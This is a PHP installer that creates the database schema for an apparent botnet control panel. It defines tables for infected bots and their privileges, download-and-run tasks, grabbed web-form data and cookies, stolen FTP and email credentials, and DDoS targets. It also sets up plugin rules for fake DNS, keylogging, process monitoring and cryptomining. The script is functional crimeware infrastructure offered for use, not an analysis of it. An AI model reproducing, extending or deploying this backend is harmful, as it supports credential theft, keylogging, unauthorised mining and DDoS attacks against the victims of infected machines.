<?php

require_once "./inc/cfg.php";
require_once "./inc/funcs.php";

mysql_init();

if (!mysql_query("DROP TABLE IF EXISTS `bots`;")) die('Check DB settings, error in "bots" table #1');
if (!mysql_query("CREATE TABLE IF NOT EXISTS `bots` (
  `id` int(11) NOT NULL auto_increment,
  `ip` varchar(46) NOT NULL,
  `os` smallint(1) NOT NULL,
  `country` varchar(4) NOT NULL,
  `time` int(11) NOT NULL,
  `cname` varchar(40) NOT NULL,
  `upd` int(1) NOT NULL,
  `seller` varchar(5) NOT NULL,
  `bits` int(1) NOT NULL,
  `doub` int(1) NOT NULL,
  `personal` int(1) NOT NULL,
  `delete` int(1) NOT NULL default '0',
  `privs` int(1) NOT NULL,
  `fsearch` int(1) NOT NULL default '0',
  `ddos` int(1) NOT NULL default '0',
  `ltaskid` int(11) NOT NULL default '0',
  `ban` int(1) NOT NULL default '0',
  `hget` int(1) NOT NULL default '0',
  `hid` varchar(20) NOT NULL,
  `hpass` varchar(5) NOT NULL,
  `htime` int(11) NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `cname` (`cname`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1;")) die('Check DB settings, error in "bots" table #2');

if (!mysql_query("DROP TABLE IF EXISTS `tasks`;")) die('Check DB settings, error in "tasks" table #3');
if (!mysql_query("CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(11) NOT NULL auto_increment,
  `seller` varchar(5) NOT NULL,
  `comment` varchar(255) NOT NULL,
  `from` varchar(255) NOT NULL,
  `loads` int(11) NOT NULL,
  `runs` int(11) NOT NULL,
  `limit` int(7) NOT NULL,
  `country` text NOT NULL,
  `time` int(11) NOT NULL,
  `stop` enum('0','1') default '0',
  `isdll` enum('0','1','2','3') default '0',
  `bits` enum('0','1','2') NOT NULL default '0',
  `delafter` enum('0','1') NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1 ;")) die('Check DB settings, error in "tasks" table #4');

if (!mysql_query("DROP TABLE IF EXISTS `personal`;")) die('Check DB settings, error in "personal" table #5');
if (!mysql_query("CREATE TABLE IF NOT EXISTS `personal` (
  `botid` int(11) NOT NULL,
  `task` varchar(255) NOT NULL,
  `isdll` enum('0','1','2','3') default '0',
  UNIQUE KEY `botid` (`botid`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;")) die('Check DB settings, error in "personal" table #6');

if (!mysql_query("DROP TABLE IF EXISTS `formgrab`;")) die('Check DB settings, error in "formgrab" table #7');
if (!mysql_query("CREATE TABLE IF NOT EXISTS `formgrab` (
  `cname` varchar(40) NOT NULL,
  `browser` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `data` TEXT NOT NULL,
  `cookies` TEXT NOT NULL,
  `uagent` varchar(255) NOT NULL,
  `time` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;")) die('Check DB settings, error in "formgrab" table #8');

if (!mysql_query("DROP TABLE IF EXISTS `ftpgrab`;")) die('Check DB settings, error in "ftpgrab" table #9');
if (!mysql_query("CREATE TABLE IF NOT EXISTS `ftpgrab` (
  `data` varchar(255) NOT NULL,
  UNIQUE KEY `data` (`data`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;")) die('Check DB settings, error in "ftpgrab" table #10');

if (!mysql_query("DROP TABLE IF EXISTS `options`;")) die('Check DB settings, error in "options" table #11');
if (!mysql_query("CREATE TABLE IF NOT EXISTS `options` (
  `upd` varchar(255) NOT NULL,
  `bot_search` LONGTEXT NOT NULL,
  `forms_search` LONGTEXT NOT NULL
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251;")
) die('Check DB settings, error in "update" table #12');
else if (!mysql_query("INSERT INTO `options` VALUES ('','','');")) die('Check DB settings, error in "options" insert #13');

if (!mysql_query("DROP TABLE IF EXISTS `plugins`;")) die('Check DB settings, error in "plugins" table #14');
if (!mysql_query("CREATE TABLE IF NOT EXISTS `plugins` (
  `hash` varchar(30) NOT NULL,
  `fgfilter` text NOT NULL,
  `fakedns_rules` text NOT NULL,
  `filesearch_rules` text NOT NULL,
  `procmon_rules` text NOT NULL,
  `ddos_rules` text NOT NULL,
  `keylog_rules` text NOT NULL,
  `fgcookies` int(1) NOT NULL default '0',
  `miner_rules` text NOT NULL
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251;")) die('Check DB settings, error in "plugins" table #15');
else if (!mysql_query("INSERT INTO `plugins` VALUES ('','','','','','','',0,'');")) die('Check DB settings, error in "plugins" insert #16');

if (!mysql_query("DROP TABLE IF EXISTS `procmon`;")) die('Check DB settings, error in "procmon" table #17');
if (!mysql_query("CREATE TABLE IF NOT EXISTS `procmon` (
  `id` int(11) NOT NULL auto_increment,
  `process` varchar(255) NOT NULL,
  `type` enum('0','1','2') NOT NULL default '0',
  `time` int(11) NOT NULL,
  `success` int(11) NOT NULL,
  `stop` enum('0','1') default '0',
  `url` varchar(255) NOT NULL,
  `comment` varchar(255) NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `process` (`process`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1 ;")) die('Check DB settings, error in "procmon" table #18');

if (!mysql_query("DROP TABLE IF EXISTS `ddos`;")) die('Check DB settings, error in "ddos" table #19');
if (!mysql_query("CREATE TABLE `ddos` (
  `id` int(11) NOT NULL auto_increment,
  `mode` int(1) NOT NULL,
  `url` varchar(255) NOT NULL,
  `state` int(1) NOT NULL DEFAULT '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1 ;")) die('Check DB settings, error in "ddos" table #20');

if (!mysql_query("DROP TABLE IF EXISTS `emailgrab`;")) die('Check DB settings, error in "emailgrab" table #21');
if (!mysql_query("CREATE TABLE IF NOT EXISTS `emailgrab` (
  `data` varchar(255) NOT NULL,
  UNIQUE KEY `data` (`data`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;")) die('Check DB settings, error in "emailgrab" table #22');

echo 'DB created. Tables is set';

echo'<meta http-equiv=REFRESH CONTENT="0;URL='.$config["cpname"].'">';

?>